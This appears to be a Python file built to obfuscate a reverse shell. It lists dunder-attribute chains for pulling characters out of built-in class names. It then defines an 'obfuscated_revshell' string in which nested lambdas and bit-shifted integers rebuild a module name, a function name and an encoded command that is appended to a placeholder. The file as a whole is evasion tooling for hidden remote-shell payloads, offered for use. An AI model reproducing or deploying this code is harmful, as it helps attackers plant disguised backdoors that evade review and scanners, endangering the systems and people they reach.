options = ["[].__iter__().__class__.__name__",
           "{}.__iter__().__class__.__name__",
           "().__iter__().__class__.__name__",
           "[].__iter__().__class__.__dict__.__class__.__name__",
           "{}.__iter__().__class__.__dict__.__class__.__name__,"
           " ().__iter__().__class__.__dict__.__class__.__name__",
           "[].__iter__().__class__.__dict__.__reduce__.__name__",
           "{}.__iter__().__class__.__dict__.__reduce__.__name__",
           "().__iter__().__class__.__dict__.__reduce__.__name__",
           "[].__iter__().__class__.__dict__.__getattribute__.__name__",
           "{}.__iter__().__class__.__dict__.__getattribute__.__name__",
           " ().__iter__().__class__.__dict__.__getattribute__.__name__",
            "[].__iter__().__class__.__dict__.__len__.__name__",
            "[].__iter__().__class__.__dict__['__length_hint__'].__name__",
            "[].__iter__().__class__.__dict__['__next__'].__name__",
           "[].__iter__().__class__.__dict__['__length_hint__'].__class__.__name__",
           "[].__iter__().__class__.__dict__['__next__'].__class__.__name__",
           "[].__iter__().__class__.__class__.__call__(int).__class__.__dict__['__doc__']",
           """ int().__class__.__class__.__name__.__class__.__class__.__call__(int).__class__.__name__.__class__.__class__.__call__(int).__class__.__class__.__call__(type('xw',(),{"__doc__" : "!@#$%^&*;[].,/\a"})).__class__.__dict__['__doc__']""",
           "int().__class__.__class__.__name__.__class__.__class__.__call__(int).__class__.__name__.__class__.__class__.__call__(int).__class__.__class__.__call__(object).__class__.__doc__",

           "int().__class__.__class__.__name__.__class__.__class__.__call__(int).__class__.__name__.__class__.__class__.__call__(int).__class__.__class__.__call__(list).__class__.__doc__",
           "int().__class__.__class__.__name__.__class__.__class__.__call__(int).__class__.__name__.__class__.__class__.__call__(int).__class__.__class__.__call__(float).__class__.__doc__",
           ]


obfuscated_revshell = """(lambda _, __, ___, ____, _____, ______, _______, ________:
    getattr(
        __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
        ().__class__.__eq__.__class__.__name__[__:__] +
        [].__iter__().__class__.__name__[__]+{}.__iter__().__class__.__name__[_______]+
        [].__iter__().__class__.__name__[__]+[].__iter__().__class__.__name__[______]+
        ().__iter__().__class__.__name__[____]+[].__iter__().__class__.__dict__.__class__.__name__[round(_/2)]
    )(placeholder +
         (lambda _, __, ___: _(_, __, ___))(
            lambda _, __, ___:
                chr(___ % __) + str(_(_, __, ___ // __)) if ___ else
                (lambda: _).__code__.co_lnotab,
            _ << ________,
            (((_____ << ____) + _) << ((___ << _____) - ___)) + (((((___ << __)
            - _) << ___) + _) << ((_____ << ____) + (_ << _))) + (((_______ <<
            __) - _) << (((((_ << ___) + _)) << ___) + (_ << _))) + (((_______
            << ___) + _) << ((_ << ______) + _)) + (((_______ << ____) - _) <<
            ((_______ << ___))) + (((_ << ____) - _) << ((((___ << __) + _) <<
            __) - _)) - (_______ << ((((___ << __) - _) << __) + _)) + (_______
            << (((((_ << ___) + _)) << __))) - ((((((_ << ___) + _)) << __) +
            _) << ((((___ << __) + _) << _))) + (((_______ << __) - _) <<
            (((((_ << ___) + _)) << _))) + (((___ << ___) + _) << ((_____ <<
            _))) + (_____ << ______) + (_ << ___)
        )
    )
)(
    *(lambda _, __, ___: _(_, __, ___))(
        (lambda _, __, ___:
         [__(___[(lambda: _).__code__.co_nlocals])] +
         _(_, __, ___[(lambda _: _).__code__.co_nlocals:]) if ___ else []
         ),
        lambda _: _.__code__.co_argcount,
        (
            lambda _: _,
            lambda _, __: _,
            lambda _, __, ___: _,
            lambda _, __, ___, ____: _,
            lambda _, __, ___, ____, _____: _,
            lambda _, __, ___, ____, _____, ______: _,
            lambda _, __, ___, ____, _____, ______, _______: _,
            lambda _, __, ___, ____, _____, ______, _______, ________: _
        )
    )
)"""